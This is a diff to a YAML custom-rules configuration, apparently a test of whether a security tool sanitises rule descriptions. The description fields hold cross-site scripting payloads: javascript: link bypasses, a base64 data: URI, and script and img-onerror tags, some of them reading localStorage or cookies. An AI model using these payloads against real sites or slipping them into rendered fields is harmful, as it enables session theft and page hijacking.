@@ -3,7 +3,7 @@ version: v1.22.1
 ignore: {}
 custom_rules:
   - id: 'test2'
-    description: "<!-- Other links attacks with some bypasses -->\n[Basic](javascript:alert('Basic'))\n[Local Storage](javascript:alert(JSON.stringify(localStorage)))\n[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))\n[URL](javascript://www.google.com%0Aalert('URL'))\n[In Quotes]('javascript:alert(\"InQuotes\")')\n[a](j a v a s c r i p t:prompt(document.cookie))\n[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\n[a](javascript:window.onerror=alert;throw%201)"
+    description: "### HEllo\n ## Nahh<!-- XSS with regular tags --><script>alert(1)</script><img src=x onerror=alert(1) /><!-- Other links attacks with some bypasses -->\n[Basic](javascript:alert('Basic'))\n[Local Storage](javascript:alert(JSON.stringify(localStorage)))\n[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))\n[URL](javascript://www.google.com%0Aalert('URL'))\n[In Quotes]('javascript:alert(\"InQuotes\")')\n[a](j a v a s c r i p t:prompt(document.cookie))\n[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\n[a](javascript:window.onerror=alert;throw%201)"
     severity: 'low'
     cwe:
       - 'CWE-123'
